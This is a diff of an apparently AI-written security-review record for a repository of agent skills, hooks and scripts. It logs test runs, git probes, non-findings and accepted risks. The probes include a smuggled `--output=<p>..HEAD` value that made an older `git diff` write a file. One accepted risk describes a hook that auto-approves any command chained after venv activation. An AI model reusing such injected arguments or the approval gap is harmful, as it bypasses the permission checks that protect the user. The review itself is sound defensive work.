-  writes nothing and parses frontmatter with `yaml.safe_load`.
-- Suites on Linux (bash 5.1.16, git 2.34.1), run from a scratch working directory with TMPDIR and
-  XDG_CACHE_HOME in the scratchpad: test-spec-backlog-apply.sh 127/127 and lint-skills.sh 562/562,
-  with no temp files left. Shellcheck 0.8.0 is clean on the backlog script at style level and on
-  both test files at warning level. tests/run-all.sh was not run, because test-review-external.sh
-  calls the real provider APIs (NOTE above).
-- Probes, each in a new scratchpad directory: the /pr merge pull case, the directory link, and the
-  External-Only range (Evidence above). Fetches into a bare repo stood in for every push. The live
-  gate refused this scan's first probe, which held a scratch `git push` among other statements,
-  before any of it ran.
+- Read in full: the codereview (774 lines), pr (259), and spec (726) skills, bin/spec-backlog-apply.sh
+  (372), and CLAUDE.md (82), including b8746a8's change to the External-only contract.
+  tests/lint-skills.sh through b8746a8's three pins and the bounds they use, with a grep of every
+  write, exec, and interpreter call; it is a static checker that writes nothing and parses
+  frontmatter with `yaml.safe_load`. The 03aacf2..HEAD diff of every file; c09fc07's diff matches
+  the working tree the prior post-fix re-check covered.
+- Suites on Linux (bash 5.1.16, git 2.34.1, gawk 5.1.0), run from a scratch working directory with
+  TMPDIR and XDG_CACHE_HOME in the scratchpad: test-spec-backlog-apply.sh 127/127 and
+  lint-skills.sh 565/565 (562 plus b8746a8's three pins), with no temp files left. Shellcheck 0.8.0
+  is clean on the backlog script at style level and on lint at warning level. tests/run-all.sh was
+  not run, because test-review-external.sh calls the real provider APIs (NOTE above); CLAUDE.md:33
+  and :72 tell agents to run run-all.sh after every skill, hook, or bin edit, which is how that
+  egress happens routinely.
+- Probes, each in a new scratchpad directory, with git 2.34.1:
+  - b8746a8's commands. E.2's `rev-parse --verify --quiet --end-of-options` exited 1 for
+    `--output=<p>` and 0 for a tag, a branch, `HEAD~1`, and `HEAD`. E.3's `git diff
+    --end-of-options` failed as a bad revision for `--output=<p>..HEAD`, quoted or split at a
+    space, and wrote nothing, where the pre-fix command wrote `<p>..HEAD`. Two-dot, three-dot, and
+    empty-tree ranges still diff.
+  - Lint mutations on a `git archive` copy of HEAD: reverting E.3, E.2, or E.4 each failed a pin.
+  - The branch-name cases in the new NOTE, and the directory link against HEAD's backlog script.
+  - No probe command named a push, and no network call was made.
 - Checked and not findings:
-  - 03aacf2's other changes. The Step 7 skip applies only when every open BLOCK and WARN carries
-    the hold mark this run writes in Step 6.5, and Step 8 still writes no marker while a BLOCK
-    remains (lines 668, 678). The `--since` date stays inside single quotes behind the format rule
-    (claude/skills/spec/SKILL.md:96-98, 258-260), and both lint pins match only the quoted form.
-    The stray end-append refusal runs before any write. A body line reading `append: <heading>`
-    after an early `end-append` still runs the lines between as ops (in CODEREVIEW.md); it touches
-    single entries, is recoverable through git, and needs the model to write such a body.
-  - The /pr merge greps each return one value against the current review files (one REVIEW_META
-    and one security metadata footer).
-  - The Step 5.6 child keeps Bash; as recorded on 2026-10-02 it starts in auto mode on this host, so
-    its Bash calls reach the classifier (settings re-read: defaultMode auto, classifyAllShell true).
-  - The backlog script's adopt date is not format-checked before `awk -v`, so `\n` in it becomes a
-    line break in BACKLOG.md; an `append:` already writes any text, so this grants nothing. Its
-    mktemp and mv path leaves BACKLOG.md at mode 0600 (as in this checkout), which is stricter.
-- Not verified: Windows and macOS at this HEAD, and the model-mediated paths (the review-state
-  downgrades, planted findings, and the two new NOTEs) against a live model.
+  - 1d1b5da, which adds the two Accepted Risks entries, is the operator's commit (author and
+    committer equal `git config user.email`), and each entry has a BACKLOG entry, so this scan
+    honors them. The /pr merge entry's BACKLOG text also records the remediation for the NOTE on
+    the pulled-changes read, which stays a NOTE because the accepted entry does not cover the read.
+  - /spec's `<<'MANIFEST'` heredocs end early only at a body line reading exactly `MANIFEST`. Every
+    body line /spec writes is a field bullet, and its delete and adopt lines carry an op prefix,
+    so repo text reaches a bare delimiter line only if the model breaks the template.
+  - CLAUDE.md holds no secrets or personal data, and its new External-only text matches the probes.
+  - The live ~/.claude/settings.json gate entry matches `Bash|Monitor` on CLI 2.1.311, with
+    defaultMode auto and classifyAllShell true. Sessions started before the re-install were not
+    checked.
+- Not verified: Windows and macOS at this HEAD; git other than 2.34.1, whose `rev-parse` or `diff`
+  may not know `--end-of-options` (an unknown option there should fail closed); whether hosting
+  services accept the branch names git accepts; and the model-mediated paths (the new range NOTE,
+  planted findings, the PR-text and META-commit NOTEs) against a live model.
 
 Git history checked for secrets: `git log -p --follow -3` for each of the six files (commits
-03aacf2, 500153c, 72dee81, 13b67ba, b47852a, 5cd6836, 5c774f1, and 6f43afe) and the 895c3d3..HEAD
+b8746a8, c09fc07, 03aacf2, 72dee81, 1608332, 500153c, b47852a, and 13b67ba) and the 03aacf2..HEAD
 diff, pattern-scanned for OpenAI, Anthropic, Google, GitHub, GitLab, AWS, Slack, Hugging Face, npm,
 and Tailscale keys, private-key headers, and generic key, token, secret, and password assignments,
-and for email addresses. No hits. None of the six files handles credentials. PII: none added.
+and for email addresses. No key hits; the one address is `bot@example.invalid`, a reserved-domain
+example in the prior entry's evidence. None of the six files handles credentials. PII: none added.
 
 Nothing left the machine, and no marker was written. zat.env's tree was not changed apart from this
 file.
-
-Post-fix re-check (same day, the working tree on 03aacf2 after /codefix), all eight dimensions, for
-the four files /codefix changed: bin/spec-backlog-apply.sh, the pr and spec skills, and
-tests/lint-skills.sh. README.md's matching change was read for the /pr merge WARN; it is plain
-markdown and outside the listed scope.
-
-- Read: the full working-tree diff of the five files, the backlog script and the pr skill in full,
-  /spec Steps 2 and 3d, and External-Only Mode Steps E.2 to E.4 (for the advice that points there).
-- Suites, run as above: test-spec-backlog-apply.sh 127/127 under gawk 5.1.0 and 127/127 under mawk
-  1.3.4 20200120 (a PATH shim); the HEAD script under the same shim failed 13 of 127, which confirms
-  the shim took effect. lint-skills.sh 562/562 under both. Shellcheck 0.8.0 is clean on the backlog
-  script at style level and on lint at warning level. No temp files were left.
-- Probes, each in a new scratchpad directory: the directory link (against /codefix's script), the
-  `-diff` and moved-`reviewed_up_to` cases for the new NOTE, and `git pull` setting ORIG_HEAD
-  (fast-forward and merge, from a local clone). `gh pr merge --help` on gh 2.4.0 still lists no
-  `--match-head-commit`. No probe command named a push.
-- Checked and not findings:
-  - The four awk regexes now spell out their intervals: the same matches under gawk, and correct
-    under mawk, which ignored the ACTIVE annotation before. No path, input, or write handling
-    changed. No awk interval expression remains in the script or in lint (the `sed -E` at line 70
-    keeps its intervals, which GNU and BSD sed support).
-  - The /spec stale-proposal date keeps its format rule and single quotes; only the literal time
-    changed, and the lint pin still matches only the quoted form.
-  - The new advice and failure report take values only from the line-185 grep (hex only, so
-    `/codereview external "${REVIEWED_UP_TO}"` cannot carry the leading dash of the External-Only
-    NOTE) and from GitHub's `.head.sha`. Every branch of the failure report stops; a push it
-    advises goes through the gate. With an empty PR_HEAD (no PR) it names the wrong cause but
-    still stops.
-  - The lint D.7 boundary change (`/^###? /`) extracts the same 23 lines under gawk and mawk.
-- Not verified: the new NOTE's paths through the skill or a live model, and the regex fix under
-  macOS's BSD awk or Git Bash (the spelled-out form needs no interval support, but it was not run
-  there).
-- Git history: HEAD is unchanged since the scan above, so its history check stands. The added lines
-  of the five-file diff were pattern-scanned for the same key families and for email addresses: no
-  hits.
 
 ### Accepted Risks
 
@@ -705,9 +616,9 @@ markdown and outside the listed scope.
   Accepted 2026-08-20 because README.md:224 and the script comment (lines 221-225) state plainly that
   the deny list is a speed bump. `autoMode.classifyAllShell` sends these commands through the
   classifier in auto mode, so the risk as accepted applies to the other permission modes. The Linux
-  host has the setting (verified 2026-10-01, 2026-10-13, and 2026-11-03), and so did the Windows host
-  (verified 2026-10-13). The hook's `git diff` before approval (its own entry above) is not covered
-  by this, because it runs ahead of the classifier.
+  host has the setting (verified 2026-10-01, 2026-10-13, 2026-11-03, and 2026-11-07), and so did the
+  Windows host (verified 2026-10-13). The hook's `git diff` before approval (its own entry above) is
+  not covered by this, because it runs ahead of the classifier.
 - **Venv-activation chains auto-approved outside auto mode** (hooks/allow-venv-source.sh:20-24): in
   default, acceptEdits, plan, and dontAsk modes, the hook returns allow for `. .venv/bin/activate &&
   <anything>`, including pipes, `$(...)`, and further commands. The user kept this behavior on
@@ -752,11 +663,11 @@ markdown and outside the listed scope.
   above); /codereview external has no such check.
 
 ---
-*Prior review (2026-11-07, scope: paths, at 895c3d3): the eleven files `codereview-marker surface
-431af78` listed, then a post-fix re-check of the six files /codefix changed; 0 BLOCK / 3 WARN / 21
-NOTE, no secrets. It resolved the Monitor gate gap and the light-tier WARN, closed the /spec date and
-turn-close NOTEs, narrowed the /pr merge WARN to the pull case, added NOTEs on carried findings
-reaching /codefix and on gh 2.4.0 lacking `--match-head-commit`, and found that this host's live
-settings.json still had the old `Bash` gate matcher.*
+*Prior review (2026-11-07, scope: paths, at 03aacf2): the six files `codereview-marker surface
+895c3d3` listed, then a post-fix re-check of the four files /codefix changed; 0 BLOCK / 3 WARN / 24
+NOTE, no secrets. It found that 03aacf2's advice to run /codereview after pulling PR changes
+reviewed nothing (/codefix replaced it with a read of the pulled commits, which a new NOTE showed
+those commits can empty), added NOTEs on External-Only Mode's leading-dash range and on /pr reading
+PR text under `Bash(*)`, and resolved no prior finding.*
 
-<!-- SECURITY_META: {"date":"2026-11-07","commit":"03aacf214ecad2498a02671958d9cba5592930e3","scope":"paths","scanned_files":["bin/spec-backlog-apply.sh","claude/skills/codereview/SKILL.md","claude/skills/pr/SKILL.md","claude/skills/spec/SKILL.md","tests/lint-skills.sh","tests/test-spec-backlog-apply.sh"],"block":0,"warn":3,"note":24} -->
+<!-- SECURITY_META: {"date":"2026-11-07","commit":"1d1b5da6d0afa8794b1ca340e5d8e8db522e318d","scope":"paths","scanned_files":["CLAUDE.md","bin/spec-backlog-apply.sh","claude/skills/codereview/SKILL.md","claude/skills/pr/SKILL.md","claude/skills/spec/SKILL.md","tests/lint-skills.sh"],"block":0,"warn":1,"note":24} -->
